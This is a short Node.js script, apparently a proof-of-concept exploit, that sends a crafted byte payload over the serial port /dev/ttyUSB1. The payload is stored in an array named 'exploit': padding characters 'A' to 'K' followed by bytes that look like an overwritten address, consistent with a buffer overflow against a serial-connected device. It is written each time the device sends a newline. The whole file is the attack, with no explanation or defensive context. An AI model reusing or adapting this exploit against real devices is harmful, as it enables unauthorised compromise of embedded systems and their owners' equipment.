var exploit  = [0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4a, 0x4b, 0x19, 0xf7, 0x01, 0xaa, 0x01, 0x43, 0x02, 0x7d, 13, 10];
var SerialPort = require("serialport").SerialPort
var port = new SerialPort('/dev/ttyUSB1', {
  	baudRate: 9600,
});

port.on('data', function(data) {
  process.stdout.write(data);
  if(data == '\n')
        port.write(new Buffer(exploit));
});
 
port.on('error', function(err) {
  console.log(err);
});
 
port.on('open', function(err) {
});
